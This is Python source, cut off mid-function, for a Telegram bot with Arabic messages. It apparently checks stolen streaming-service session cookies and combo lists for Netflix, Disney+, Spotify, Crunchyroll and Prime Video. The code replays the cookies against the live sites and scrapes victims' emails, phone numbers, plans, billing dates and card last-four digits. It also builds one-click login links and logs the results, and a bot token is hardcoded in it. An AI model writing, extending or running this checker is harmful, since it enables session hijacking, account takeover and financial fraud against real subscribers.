import os
import asyncio
import json
import re
import sqlite3
import urllib.parse
import tempfile
from datetime import datetime
import requests
from bs4 import BeautifulSoup
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, filters, ContextTypes
)

TOKEN    = os.environ.get('7603798975:AAH2MW--B6aZUs15OSxfq75RMUeD6L6fX0c')
try:
    ADMIN_ID = int(os.environ.get('ADMIN_ID', '0'))
except (ValueError, TypeError):
    ADMIN_ID = 0
DB_PATH     = 'data/bot.db'
ACTIVE_JOBS: dict = {}   # user_id → asyncio.Event (set = stop requested)

PLATFORMS = {
    'netflix': {
        'name': 'Netflix', 'emoji': '🎬',
        'keywords': ['netflixid', 'securenetflixid', 'nfvdid', 'netflix'],
        'base_url': 'https://www.netflix.com/unsupported?nftoken=',
        'check_url': 'https://www.netflix.com/',
        'account_url': 'https://www.netflix.com/YourAccount',
    },
    'disney': {
        'name': 'Disney+', 'emoji': '🏰',
        'keywords': ['bamgrid', 'disney', 'disneyplus'],
        'base_url': 'https://www.disneyplus.com/',
        'check_url': 'https://www.disneyplus.com/',
        'account_url': 'https://www.disneyplus.com/account',
    },
    'spotify': {
        'name': 'Spotify', 'emoji': '🎵',
        'keywords': ['sp_dc', 'sp_key', 'spotify'],
        'base_url': 'https://open.spotify.com/',
        'check_url': 'https://open.spotify.com/',
        'account_url': 'https://www.spotify.com/account/overview/',
    },
    'crunchyroll': {
        'name': 'Crunchyroll', 'emoji': '🍥',
        'keywords': ['crunchyroll', '_cr_', 'etp_rt'],
        'base_url': 'https://www.crunchyroll.com/',
        'check_url': 'https://www.crunchyroll.com/',
        'account_url': 'https://www.crunchyroll.com/settings',
    },
    'prime': {
        'name': 'Prime Video', 'emoji': '📦',
        'keywords': ['x-main', 'at-main', 'sess-at-main', 'ubid-main',
                     'session-id', 'primevideo', 'amazon'],
        'base_url': 'https://www.primevideo.com/',
        'check_url': 'https://www.primevideo.com/',
        'account_url': 'https://www.amazon.com/gp/primecentral',
    },
}

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                  '(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Accept-Language': 'en-US,en;q=0.9',
}

# ─── Database ────────────────────────────────────────────────────────────────

def init_db():
    os.makedirs('data', exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id      INTEGER PRIMARY KEY,
        username     TEXT,
        first_seen   TEXT,
        last_active  TEXT,
        total_checks INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS checks (
        id        INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id   INTEGER,
        platform  TEXT,
        valid     INTEGER,
        link      TEXT,
        timestamp TEXT
    )''')
    conn.commit()
    conn.close()

def db_update_user(user_id, username):
    now = datetime.now().strftime('%Y-%m-%d %H:%M')
    conn = sqlite3.connect(DB_PATH)
    conn.execute(
        '''INSERT INTO users (user_id, username, first_seen, last_active, total_checks)
           VALUES (?, ?, ?, ?, 0)
           ON CONFLICT(user_id) DO UPDATE SET
               username=excluded.username, last_active=excluded.last_active''',
        (user_id, username or 'unknown', now, now)
    )
    conn.commit()
    conn.close()

def db_record_check(user_id, platform, valid, link):
    now = datetime.now().strftime('%Y-%m-%d %H:%M')
    conn = sqlite3.connect(DB_PATH)
    conn.execute(
        'INSERT INTO checks (user_id, platform, valid, link, timestamp) VALUES (?, ?, ?, ?, ?)',
        (user_id, platform, int(valid), link, now)
    )
    conn.execute(
        'UPDATE users SET total_checks = total_checks + 1, last_active = ? WHERE user_id = ?',
        (now, user_id)
    )
    conn.commit()
    conn.close()

def db_get_stats():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    total_users   = c.execute('SELECT COUNT(*) FROM users').fetchone()[0]
    total_checks  = c.execute('SELECT COUNT(*) FROM checks').fetchone()[0]
    valid_checks  = c.execute('SELECT COUNT(*) FROM checks WHERE valid=1').fetchone()[0]
    platform_rows = c.execute(
        'SELECT platform, COUNT(*) FROM checks GROUP BY platform ORDER BY COUNT(*) DESC'
    ).fetchall()
    conn.close()
    return total_users, total_checks, valid_checks, platform_rows

def db_get_history(user_id, limit=10):
    conn = sqlite3.connect(DB_PATH)
    rows = conn.execute(
        'SELECT platform, valid, link, timestamp FROM checks '
        'WHERE user_id=? ORDER BY timestamp DESC LIMIT ?',
        (user_id, limit)
    ).fetchall()
    conn.close()
    return rows

# ─── Cookie Utilities ─────────────────────────────────────────────────────────

def parse_cookies(text):
    text = text.strip()
    cookies = {}

    # JSON array format
    try:
        data = json.loads(text)
        if isinstance(data, list):
            for c in data:
                if isinstance(c, dict) and 'name' in c and 'value' in c:
                    cookies[c['name']] = c['value']
            if cookies:
                return cookies, 'json'
    except Exception:
        pass

    # Netscape format — tabs OR spaces as separator
    # Format: domain  flag  path  secure  expiry  name  value
    NETSCAPE_RE = re.compile(
        r'^(#HttpOnly_)?(\S+)\s+(TRUE|FALSE)\s+(/\S*)\s+(TRUE|FALSE)\s+(\d+)\s+(\S+)\s*(.*)',
        re.IGNORECASE
    )
    ns = {}
    for line in text.split('\n'):
        line = line.strip()
        if not line or line.startswith('# ') or line == '#':
            continue
        m = NETSCAPE_RE.match(line)
        if m:
            name  = m.group(7).strip()
            value = m.group(8).strip()
            if name:
                ns[name] = value
    if ns:
        return ns, 'netscape'

    # key=value format
    kv = {}
    for part in text.replace('\n', ';').split(';'):
        part = part.strip()
        if '=' in part:
            k, _, v = part.partition('=')
            kv[k.strip()] = v.strip()
    if kv:
        return kv, 'keyvalue'

    return {}, 'unknown'

def detect_platform(cookies):
    names = ' '.join(cookies.keys()).lower()
    for pid, pdata in PLATFORMS.items():
        for kw in pdata['keywords']:
            if kw in names:
                return pid
    return None

def convert_to_all_formats(cookies):
    json_fmt = json.dumps(
        [{'name': k, 'value': v, 'domain': '.platform.com',
          'path': '/', 'httpOnly': False, 'secure': True}
         for k, v in cookies.items()],
        indent=2
    )
    kv_fmt = '; '.join(f'{k}={v}' for k, v in cookies.items())
    ns_lines = ['# Netscape HTTP Cookie File']
    for k, v in cookies.items():
        ns_lines.append(f'.platform.com\tTRUE\t/\tFALSE\t0\t{k}\t{v}')
    ns_fmt = '\n'.join(ns_lines)
    return json_fmt, kv_fmt, ns_fmt

_PIPE_LINE_RE = re.compile(
    r'^[^\s|@]+[@:][^\s|]+\s*\|',  # starts with email:pass | OR user:pass |
    re.IGNORECASE
)

def split_accounts(content):
    """Split file content into individual account blocks."""
    # ── Pipe-line format: each line = one account ─────────────────────────────
    # e.g.: email:pass | Key = Val | ... | Cookie = NetflixId=...
    pipe_lines = [l.strip() for l in content.split('\n')
                  if l.strip() and _PIPE_LINE_RE.match(l.strip())]
    if pipe_lines:
        return pipe_lines

    # ── Explicit separators ────────────────────────────────────────────────────
    for sep in ['---', '===', '***', '|||']:
        if sep in content:
            parts = [p.strip() for p in content.split(sep) if p.strip()]
            if len(parts) > 1:
                return parts

    # ── Multiple JSON arrays [...] ─────────────────────────────────────────────
    json_blocks = re.findall(r'\[[\s\S]*?\]', content)
    valid_blocks = []
    for block in json_blocks:
        try:
            data = json.loads(block)
            if isinstance(data, list) and any(
                isinstance(c, dict) and 'name' in c for c in data
            ):
                valid_blocks.append(block)
        except Exception:
            pass
    if len(valid_blocks) > 1:
        return valid_blocks

    # ── One JSON array per line ────────────────────────────────────────────────
    line_blocks = []
    for line in content.strip().split('\n'):
        line = line.strip()
        if line.startswith('[') and line.endswith(']'):
            try:
                data = json.loads(line)
                if isinstance(data, list):
                    line_blocks.append(line)
            except Exception:
                pass
    if len(line_blocks) > 1:
        return line_blocks

    # ── Netscape blocks separated by blank lines ───────────────────────────────
    blocks = [b.strip() for b in re.split(r'\n\s*\n', content) if b.strip()]
    if len(blocks) > 1:
        return blocks

    return [content.strip()]


_NS_RE = re.compile(
    r'^(#HttpOnly_)?(\S+)\s+(TRUE|FALSE)\s+(/\S*)\s+(TRUE|FALSE)\s+(\d+)\s+(\S+)\s*(.*)',
    re.IGNORECASE
)

def parse_account_block(block):
    """Extract email, password, metadata, and cookie text from an account block.

    Supports two layouts:
    1) Pipe-line  : email:pass | Key = Val | ... | Cookie = NetflixId=... [| SecureNetflixId=...]
    2) Multi-line : email:pass on first line, then Netscape/key=value cookies
    Returns dict: {email, password, metadata, cookie_text, raw}
    """
    block = block.strip()
    email      = None
    password   = None
    metadata   = {}
    cookie_text = ''

    # ── Layout 1: pipe-separated single line ─────────────────────────────────
    if ' | ' in block and '\n' not in block:
        parts      = [p.strip() for p in block.split(' | ')]
        first      = parts[0]
        cookie_parts = []

        # First segment → email:password
        if ':' in first:
            left, _, right = first.partition(':')
            email    = left.strip()
            password = right.strip() or None

        # Remaining segments → key = value metadata OR Cookie = ...
        for seg in parts[1:]:
            # Cookie field(s) — may be "Cookie = NetflixId=..." or "SecureNetflixId=..."
            if re.match(r'^(Cookie|Cookies)\s*=\s*', seg, re.IGNORECASE):
                val = re.sub(r'^(Cookie|Cookies)\s*=\s*', '', seg, flags=re.IGNORECASE)
                cookie_parts.append(val.strip())
            elif re.match(r'^(NetflixId|SecureNetflixId|nfvdid|'
                          r'disney_|DSID|SP_DC|ADP_TOKEN|arl|'
                          r'auth_token|cf_clearance).*=', seg, re.IGNORECASE):
                # Looks like a raw cookie key=value pair
                cookie_parts.append(seg.strip())
            elif ' = ' in seg:
                k, _, v = seg.partition(' = ')
                metadata[k.strip()] = v.strip()
            elif '=' in seg and not ' ' in seg.split('=')[0]:
                # raw key=value with no spaces → treat as cookie
                cookie_parts.append(seg.strip())
            else:
                metadata[seg] = ''

        cookie_text = '; '.join(cookie_parts)

    # ── Layout 2: multi-line block ────────────────────────────────────────────
    else:
        lines        = block.split('\n')
        cookie_lines = []
        other_lines  = []

        for line in lines:
            stripped = line.strip()
            if not stripped:
                continue
            if _NS_RE.match(stripped):
                cookie_lines.append(stripped)
            elif stripped.startswith('[') and stripped.endswith(']'):
                try:
                    json.loads(stripped)
                    cookie_lines.append(stripped)
                except Exception:
                    other_lines.append(stripped)
            else:
                other_lines.append(stripped)

        for line in other_lines:
            if email is None and ':' in line:
                left, _, right = line.partition(':')
                left = left.strip()
                if left and ' ' not in left and len(left) <= 80:
                    email    = left
                    password = right.strip() or None
                    continue
            if ' = ' in line:
                k, _, v = line.partition(' = ')
                metadata[k.strip()] = v.strip()

        if cookie_lines:
            cookie_text = '\n'.join(cookie_lines)
        else:
            combined = '; '.join(
                l for l in other_lines
                if '=' in l and ' ' not in l.split('=')[0]
            )
            cookie_text = combined if combined else block

    # ── Pull known fields from metadata into dedicated keys ───────────────────
    META_MAP = {
        'email'          : ['email', 'emailAddress'],
        'plan'           : ['memberPlan', 'planName', 'plan', 'Price'],
        'member_since'   : ['memberSince', 'member_since'],
        'next_billing'   : ['NextBillingDate', 'next_billing'],
        'country'        : ['Country', 'countryOfSignup', 'region'],
        'phone'          : ['phonenumber', 'phone'],
        'profiles'       : ['connetedProfiles', 'connectedProfiles', 'numProfiles'],
        'video_quality'  : ['videoQuality'],
        'max_streams'    : ['maxStreams'],
        'extra_members'  : ['hasExtraMember'],
        'email_verified' : ['emailVerified'],
        'phone_verified' : ['numberVerified'],
        'status'         : ['membershipStatus'],
    }
    extracted = {}
    for field, keys in META_MAP.items():
        for k in keys:
            if k in metadata:
                extracted[field] = metadata[k]
                break

    # Build payment string from cardBrand + last4
    card_brand = metadata.get('cardBrand', '').strip('[]')
    last4      = metadata.get('last4', '').strip('[]')
    pay_method = metadata.get('paymentMethod', '')
    if card_brand and last4:
        extracted['payment_method'] = f"{card_brand} ···· {last4}"
    elif pay_method:
        extracted['payment_method'] = pay_method

    return {
        'email'      : email,
        'password'   : password,
        'metadata'   : metadata,
        'extracted'  : extracted,
        'cookie_text': cookie_text,
        'raw'        : block,
    }


# ─── Platform Checkers ───────────────────────────────────────────────────────

NETFLIX_REQUIRED_COOKIES = {'NetflixId', 'SecureNetflixId'}
NETFLIX_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                  '(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
}

# Returns (info_dict | None, error_reason | None)
def _fetch_netflix(cookies):
    # ── Step 1: structural pre-check ──────────────────────────────────────────
    cookie_keys_lower = {k.lower() for k in cookies}
    has_id  = 'netflixid'       in cookie_keys_lower
    has_sid = 'securenetflixid' in cookie_keys_lower
    if not (has_id or has_sid):
        return None, 'missing_keys'   # cookies don't even have Netflix keys

    session = requests.Session()
    session.cookies.update(cookies)

    try:
        # ── 1. Home page: verify login + get authURL + BUILD_ID ───────────────
        r = session.get('https://www.netflix.com/', headers=NETFLIX_HEADERS,
                        timeout=20, allow_redirects=True)
        if '/login' in r.url or r.status_code in (401, 403):
            return None, 'invalid'

        home_text   = r.text
        auth_match  = re.search(r'"authURL"\s*:\s*"([^"]+)"', home_text)
        auth_url    = auth_match.group(1) if auth_match else ''
        build_match = re.search(r'"BUILD_IDENTIFIER"\s*:\s*"([^"]+)"', home_text)
        build_id    = build_match.group(1) if build_match else 'mre'

        api_url     = f'https://www.netflix.com/api/shakti/{build_id}/pathEvaluator'
        api_hdrs    = {**NETFLIX_HEADERS,
                       'Content-Type': 'application/x-www-form-urlencoded',
                       'X-Netflix.Request.Client.User.GUID': ''}

        def shakti(path_obj):
            try:
                resp = session.post(api_url, headers=api_hdrs, timeout=15,
                                    data={'path': json.dumps(path_obj), 'authURL': auth_url})
                if resp.status_code == 200:
                    return resp.json().get('value', {})
            except Exception:
                pass
            return {}

        # ── 2. Shakti: full user info ─────────────────────────────────────────
        ui_fields = ["name","emailAddress","membershipStatus","countryOfSignup",
                     "memberFor","language","showExtraMemberUI","numProfiles",
                     "phoneNumber","emailVerified","phoneVerified","userGuid",
                     "maxProfiles","membershipExpiration","videoQuality","maxStreams",
                     "streamingQuality","canWatchHDR","is4KEnabled"]
        sv        = shakti(["userInfo", ui_fields])
        ui        = sv.get('userInfo', {}) or {}

        # ── 3. Shakti: profiles list ──────────────────────────────────────────
        pv2       = shakti(["profilesList", {"from": 0, "to": 6}, ["summary"]])
        prof_names = []
        for _k, _v in (pv2.get('profilesList') or {}).items():
            if isinstance(_v, dict):
                s = _v.get('summary', {})
                n = s.get('profileName') or s.get('displayName')
                if n and isinstance(n, str):
                    prof_names.append(n)

        # ── 4. Shakti: billing / plan paths (best-effort) ─────────────────────
        bv  = shakti(["memberDashboard", ["membershipStatus","nextBillingDate",
                                          "planName","planPrice","memberSince",
                                          "videoQuality","maxStreams","numDevices"]])
        bmd = bv.get('memberDashboard', {}) or {}

        # ── 5. YourAccount page: HTML scraping ───────────────────────────────
        r_acct = session.get('https://www.netflix.com/YourAccount',
                             headers=NETFLIX_HEADERS, timeout=20)
        if '/login' in r_acct.url:
            return None, 'invalid'
        acct = r_acct.text

        # Try to parse reactContext JSON blob
        rc = {}
        for patt in [r'netflix\.reactContext\s*=\s*(\{.{200,}\})\s*;',
                     r'"reactContext"\s*=\s*(\{.{200,}\})\s*;']:
            m = re.search(patt, acct, re.DOTALL)
            if m:
                try:
                    rc = json.loads(m.group(1)); break
                except Exception:
                    pass

        def _clean(s):
            """Decode JS/JSON escape sequences, HTML entities and clean whitespace."""
            if not s or s == 'N/A':
                return s
            # decode \uXXXX  e.g. \u0020 → space
            s = re.sub(r'\\u([0-9a-fA-F]{4})',
                       lambda m: chr(int(m.group(1), 16)), s)
            # decode \xXX  e.g. \x20 → space
            s = re.sub(r'\\x([0-9a-fA-F]{2})',
                       lambda m: chr(int(m.group(1), 16)), s)
            # decode HTML hex entities e.g. &#x40; → @
            s = re.sub(r'&#x([0-9a-fA-F]+);',
                       lambda m: chr(int(m.group(1), 16)), s)
            # decode HTML decimal entities e.g. &#32; → space
            s = re.sub(r'&#(\d+);',
                       lambda m: chr(int(m.group(1))), s)
            # decode common HTML named entities
            for ent, ch in [('&amp;','&'),('&lt;','<'),('&gt;','>'),
                             ('&quot;','"'),('&#39;',"'"),('&nbsp;',' ')]:
                s = s.replace(ent, ch)
            return ' '.join(s.split())

        def rex(src, patterns, default='N/A'):
            for p in patterns:
                m = re.search(p, src, re.IGNORECASE)
                if m:
                    g = next((x for x in m.groups() if x), None)
                    return _clean(g.strip()) if g else default
            return default

        # ── 6. Assemble fields: priority = ui API > bmd API > acct HTML ──────

        # Email — try Shakti API first, then account page, then settings page
        email = ui.get('emailAddress')
        if not email or email == 'N/A':
            email = rex(acct, [
                r'"emailAddress"\s*:\s*"([^"@\s]{2,}@[^"@\s]{2,})"',
                r'data-uia="account-email"[^>]*>\s*([^<\s][^<]{2,})',
                r'"email"\s*:\s*"([^"@\s]{2,}@[^"@\s]{2,})"',
            ])
        if not email or email == 'N/A':
            # try account settings page
            try:
                r_set = session.get('https://www.netflix.com/account/getmyinfo',
                                    headers=NETFLIX_HEADERS, timeout=10)
                if r_set.status_code == 200:
                    em = re.search(r'"emailAddress"\s*:\s*"([^"@]+@[^"]+)"', r_set.text)
                    if em:
                        email = em.group(1)
            except Exception:
                pass

        region = (ui.get('countryOfSignup')
                  or rex(acct, [r'"countryOfSignup"\s*:\s*"([A-Z]{2,3})"',
                                r'"country"\s*:\s*"([A-Z]{2,3})"']))

        lang = (ui.get('language')
                or rex(acct, [r'"preferredLocale"\s*:\s*"([^"]+)"',
                              r'"displayLanguage"\s*:\s*"([^"]+)"',
                              r'"language"\s*:\s*"([a-z]{2,5}(?:-[A-Z]{2})?)"']))

        plan = (bmd.get('planName')
                or rex(acct, [r'"planName"\s*:\s*"([^"]+)"',
                              r'"membershipDescription"\s*:\s*"([^"]+)"',
                              r'"planTier"\s*:\s*"([^"]+)"',
                              r'data-uia="plan-label"[^>]*>\s*([^<]+)']))

        # memberFor = days since signup → convert to date
        since = _clean(bmd.get('memberSince') or rex(acct, [
            r'"memberSince"\s*:\s*"([^"]+)"',
            r'Member\s+since\s*:?\s*([A-Za-z]+\s+\d{4})',
            r'[Mm]embro?\s+desde\s*:?\s*([A-Za-z][^<\n"]{3,25})',
        ]))
        if since == 'N/A' and ui.get('memberFor'):
            try:
                from datetime import datetime as _dt, timedelta as _td
                since = (_dt.now() - _td(days=int(ui['memberFor']))).strftime('%B %Y')
            except Exception:
                since = f"{ui['memberFor']} days"

        bill = _clean(bmd.get('nextBillingDate') or rex(acct, [
            r'"nextBillingDate"\s*:\s*"([^"]+)"',
            r'[Nn]ext\s+billing\s+date\s*:?\s*([A-Za-z0-9][^<\n"]{3,25})',
            r'"renewalDate"\s*:\s*"([^"]+)"',
        ]))

        # Phone — only trust the Shakti API; HTML regex produces false positives
        raw_phone = ui.get('phoneNumber') or rex(acct, [
            r'"phoneNumber"\s*:\s*"(\+[1-9]\d{6,14})"',
        ])
        # validate: must have at least 7 actual digits
        phone = 'N/A'
        if raw_phone and raw_phone != 'N/A':
            digits = re.sub(r'\D', '', raw_phone)
            if len(digits) >= 7:
                phone = raw_phone

        pay = 'N/A'
        for pm_patt in [
            r'(VISA|MASTERCARD|AMEX|PAYPAL|DISCOVER)[^\d]*(\d{4})',
            r'"paymentMethodType"\s*:\s*"([^"]+)"[^}]*"lastFour"\s*:\s*"(\d{4})"',
            r'"cardType"\s*:\s*"([^"]+)"[^}]*"lastFour"\s*:\s*"(\d{4})"',
        ]:
            pm = re.search(pm_patt, acct, re.IGNORECASE)
            if pm:
                pay = f"{pm.group(1).upper()} ···· {pm.group(2)}"
                break

        if prof_names:
            profiles = ', '.join(prof_names[:6])
        else:
            raw = list(dict.fromkeys(re.findall(r'"profileName"\s*:\s*"([^"]+)"', acct)))[:6]
            num = ui.get('numProfiles')
            profiles = ', '.join(raw) if raw else (f"({num} profiles)" if num else 'N/A')

        show_extra = ui.get('showExtraMemberUI', False)
        extra = 'Yes ✅' if show_extra else 'No ❌'
        if extra == 'No ❌' and re.search(
                r'extra.{0,10}member.{0,50}(active|enabled|true)', acct, re.IGNORECASE):
            extra = 'Yes ✅'

        # Verified flags — prefer API booleans
        def _verified(api_key, html_key):
            api_val = ui.get(api_key)
            if api_val is True:  return '✅ Verified'
            if api_val is False: return '❌ Not Verified'
            m2 = re.search(rf'"{html_key}"\s*:\s*(true|false)', acct, re.IGNORECASE)
            if m2: return '✅ Verified' if m2.group(1) == 'true' else '❌ Not Verified'
            return '❓ Unknown'

        # Verified flags — prefer API booleans
        def _verified(api_key, html_key):
            api_val = ui.get(api_key)
            if api_val is True:  return '✅ Verified'
            if api_val is False: return '❌ Not Verified'
            m2 = re.search(rf'"{html_key}"\s*:\s*(true|false)', acct, re.IGNORECASE)
            if m2: return '✅ Verified' if m2.group(1) == 'true' else '❌ Not Verified'
            # try rc JSON blob
            m3 = re.search(rf'"{html_key}"\s*:\s*(true|false)', str(rc), re.IGNORECASE)
            if m3: return '✅ Verified' if m3.group(1) == 'true' else '❌ Not Verified'
            return '❓ Unknown'

        email_verified = _verified('emailVerified', 'emailVerified')
        phone_verified = _verified('phoneVerified', 'phoneVerified')

        # ── Video Quality & Max Streams ───────────────────────────────────────
        vq = (ui.get('videoQuality') or ui.get('streamingQuality')
              or bmd.get('videoQuality')
              or rex(acct, [
                  r'"videoQuality"\s*:\s*"([^"]+)"',
                  r'"streamingQuality"\s*:\s*"([^"]+)"',
                  r'data-uia="video-quality"[^>]*>\s*([^<]+)',
              ]))
        # Normalize quality labels
        if vq and vq != 'N/A':
            vq_up = vq.upper()
            if '4K' in vq_up or 'UHD' in vq_up:
                vq = 'Ultra HD (4K)'
            elif 'HD' in vq_up or '1080' in vq_up:
                vq = 'Full HD (1080p)'
            elif 'SD' in vq_up or '480' in vq_up:
                vq = 'SD (480p)'

        ms = (ui.get('maxStreams') or bmd.get('maxStreams')
              or rex(acct, [
                  r'"maxStreams"\s*:\s*(\d+)',
                  r'"simultaneousStreams"\s*:\s*(\d+)',
                  r'data-uia="max-streams"[^>]*>\s*(\d+)',
              ]))

        return {
            'status'        : 'Active ✅',
            'email'         : email         or 'N/A',
            'region'        : region        or 'N/A',
            'language'      : lang          or 'N/A',
            'plan'          : plan          or 'N/A',
            'video_quality' : vq            or 'N/A',
            'max_streams'   : str(ms)       if ms and str(ms) != 'N/A' else 'N/A',
            'member_since'  : since         or 'N/A',
            'next_billing'  : bill          or 'N/A',
            'payment'       : pay,
            'profiles'      : profiles,
            'phone'         : phone         or 'N/A',
            'email_verified': email_verified,
            'phone_verified': phone_verified,
            'extra_members' : extra,
        }, None

    except requests.exceptions.Timeout:
        return None, 'timeout'
    except requests.exceptions.ConnectionError:
        return None, 'connection'
    except Exception as e:
        print(f"Netflix check error: {e}")
        return None, 'error'

PRIME_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                  '(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
}

def _fetch_prime(cookies):
    cookie_keys_lower = {k.lower() for k in cookies}
    prime_keys = {'x-main', 'at-main', 'sess-at-main', 'ubid-main', 'session-id', 'session-token'}
    if not (cookie_keys_lower & prime_keys):
        return None, 'missing_keys'

    session = requests.Session()
    session.cookies.update(cookies)

    try:
        # ── Step 1: check primevideo.com ──────────────────────────────────────
        r = session.get(
            'https://www.primevideo.com/',
            headers=PRIME_HEADERS, timeout=20, allow_redirects=True
        )
        url_lower = r.url.lower()
        if any(x in url_lower for x in ('/ap/signin', '/gp/sign', 'signin', '/ap/register')):
            return None, 'invalid'
        if r.status_code in (401, 403):
            return None, 'invalid'

        home_text = r.text

        def rex(src, patterns, default='N/A'):
            for p in patterns:
                m = re.search(p, src, re.IGNORECASE | re.DOTALL)
                if m:
                    grp = next((g for g in m.groups() if g), None)
                    return grp.strip() if grp else default
            return default

        # ── Step 2: fetch Amazon account page for details ────────────────────
        r2 = session.get(
            'https://www.amazon.com/gp/primecentral',
            headers=PRIME_HEADERS, timeout=20, allow_redirects=True
        )
        acct = r2.text if r2.status_code == 200 else home_text

        # ── Step 3: fetch account/profile page ───────────────────────────────
        r3 = session.get(
            'https://www.amazon.com/gp/css/account/info/view.html',
            headers=PRIME_HEADERS, timeout=20, allow_redirects=True
        )
        profile_text = r3.text if r3.status_code == 200 else ''

        combined = home_text + '\n' + acct + '\n' + profile_text

        # ── Extract fields ────────────────────────────────────────────────────
        name = rex(combined, [
            r'"customerName"\s*:\s*"([^"]+)"',
            r'<span[^>]*id="[^"]*nav-link-accountList-nav-line-1"[^>]*>\s*([^<\n]+)',
            r'Hello,\s*([^<\n]+)',
            r'"name"\s*:\s*"([A-Za-z][^"]{1,40})"',
        ])

        email = rex(combined, [
            r'"email"\s*:\s*"([^"@"]+@[^"]+)"',
            r'<span[^>]*class="[^"]*email[^"]*"[^>]*>\s*([^<]+)',
            r'Your e-mail address:\s*([^\s<]+)',
        ])

        plan = rex(combined, [
            r'(Prime\s+(?:Video\s+)?(?:Monthly|Annual|Student|Lite)[^<"]*)',
            r'"planType"\s*:\s*"([^"]+)"',
            r'(Annual|Monthly|Student)\s+(?:Prime|Membership)',
            r'Your\s+(?:Amazon\s+)?Prime\s+([^\s<]+(?:\s+[^\s<]+){0,2})',
        ])

        renews = rex(combined, [
            r'(?:Renewal|Next\s+billing|Renews?)\s*(?:date|on)?\s*:?\s*([A-Za-z]+\s+\d+,?\s+\d{4})',
            r'"nextBillingDate"\s*:\s*"([^"]+)"',
            r'Membership\s+renews?\s+on\s+([A-Za-z]+\s+\d+,?\s+\d{4})',
        ])

        member_since = rex(combined, [
            r'[Mm]ember\s+since\s*:?\s*([A-Za-z]+\s+\d{4})',
            r'"memberSince"\s*:\s*"([^"]+)"',
        ])

        region = rex(combined, [
            r'"countryCode"\s*:\s*"([A-Z]{2})"',
            r'"marketplaceId"\s*:\s*"([^"]+)"',
        ])

        # Payment method
        pay = 'N/A'
        pm = re.search(
            r'(Visa|Mastercard|MasterCard|Amex|American\s+Express|Discover)[^\d]*(\d{4})',
            combined, re.IGNORECASE
        )
        if pm:
            pay = f"{pm.group(1).title()} ···· {pm.group(2)}"

        # Prime status
        is_prime = bool(re.search(
            r'(Amazon\s+Prime|Prime\s+Video|prime-badge|isPrime.*true|"isPrime"\s*:\s*true)',
            combined, re.IGNORECASE
        ))
        status = 'Active ✅' if is_prime else 'Active (Unverified) ✅'

        return {
            'status'      : status,
            'name'        : name,
            'email'       : email,
            'plan'        : plan,
            'member_since': member_since,
            'next_billing': renews,
            'payment'     : pay,
            'region'      : region,
        }, None

    except requests.exceptions.Timeout:
        return None, 'timeout'
    except requests.exceptions.ConnectionError:
        return None, 'connection'
    except Exception as e:
        print(f"Prime check error: {e}")
        return None, 'error'


def _fetch_generic(platform_id, cookies):
    pdata = PLATFORMS[platform_id]
    session = requests.Session()
    session.cookies.update(cookies)
    try:
        r = session.get(pdata['check_url'], headers=HEADERS, timeout=15)
        if 'login' in r.url or 'signin' in r.url or r.status_code in (401, 403):
            return None, 'invalid'
        return {'status': 'Active ✅'}, None
    except requests.exceptions.Timeout:
        return None, 'timeout'
    except Exception:
        return None, 'error'

def fetch_account_info(platform_id, cookies):
    if platform_id == 'netflix':
        info, reason = _fetch_netflix(cookies)
    elif platform_id == 'prime':
        info, reason = _fetch_prime(cookies)
    else:
        info, reason = _fetch_generic(platform_id, cookies)
    return info, reason

ERROR_MESSAGES = {
    'missing_keys': (
        "❌ *الكوكيز غير صحيحة*\n\n"
        "لم أجد مفاتيح Netflix الأساسية مثل `NetflixId` أو `SecureNetflixId`.\n"
        "تأكد أنك نسخت الكوكيز الصحيحة من حساب Netflix."
    ),
    'invalid': (
        "🔴 *الكوكيز منتهية أو غير صالحة*\n\n"
        "تم التحقق من الكوكيز وهي غير صالحة — ربما انتهت صلاحيتها أو تم تسجيل الخروج من الحساب."
    ),
    'timeout': (
        "⏱ *انتهى وقت الاتصال*\n\n"
        "استغرق الاتصال بالمنصة وقتاً طويلاً. حاول مجدداً بعد لحظة."
    ),
    'connection': (
        "🌐 *خطأ في الاتصال*\n\n"
        "تعذّر الاتصال بالمنصة. تأكد من الاتصال بالإنترنت وأعد المحاولة."
    ),
    'error': (
        "⚠️ *حدث خطأ غير متوقع*\n\n"
        "حاول إرسال الكوكيز مجدداً أو تأكد من صيغتها."
    ),
}

def build_login_link(platform_id, cookies_raw):
    encoded = urllib.parse.quote(cookies_raw)
    return f"{PLATFORMS[platform_id]['base_url']}{encoded}"

def build_login_links(platform_id, cookies_raw):
    """Return (pc_link, phone_link) tuple."""
    encoded = urllib.parse.quote(cookies_raw)
    base = PLATFORMS[platform_id]['base_url']
    pc_link    = f"{base}{encoded}"
    phone_link = f"{base}{encoded}&mobile=1"
    return pc_link, phone_link

def build_result_message(platform_id, info, login_link):
    p = PLATFORMS[platform_id]

    def v(key, fallback='N/A'):
        val = info.get(key) or info.get('_file', {}).get(key)
        return val if val and val != 'N/A' else fallback

    if platform_id == 'netflix':
        pc_link, phone_link = build_login_links(platform_id,
                                                info.get('_cookies_raw', ''))
